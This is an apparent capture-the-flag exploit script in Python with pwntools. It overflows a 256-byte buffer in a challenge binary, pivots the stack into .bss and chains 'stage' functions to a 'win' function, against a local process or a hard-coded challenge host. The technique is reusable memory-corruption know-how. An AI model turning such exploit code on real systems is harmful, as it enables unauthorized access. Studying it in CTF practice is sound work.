from pwn import *

REMOTE = False

HOST = '3.34.91.236'
PORT = 20004

if REMOTE:
    io = remote(HOST, PORT)
else:
    io = process('./deploy/main')

elf = ELF('./main')
fake_stack = elf.bss() + 0xf00
win = 0x4011ad
stage1 = 0x401176
stage2 = 0x401189
stage3 = 0x40119b
leave_ret = 0x40126d
payload = b'a'*256 + p64(fake_stack) + p64(0x401253) # lea    rax,[rbp-0x100]
io.send(payload)
sleep(0.1)
payload = p64(stage1) + p64(stage2) + p64(stage3) + p64(win)
payload += p64(fake_stack - 0x100) # [rbp - 0x100]
payload = payload.ljust(256, b'\x00')
payload += p64(fake_stack - 0x100 - 0x8) # ret = rbp + 0x8
payload += p64(leave_ret)
io.send(payload)
io.interactive()
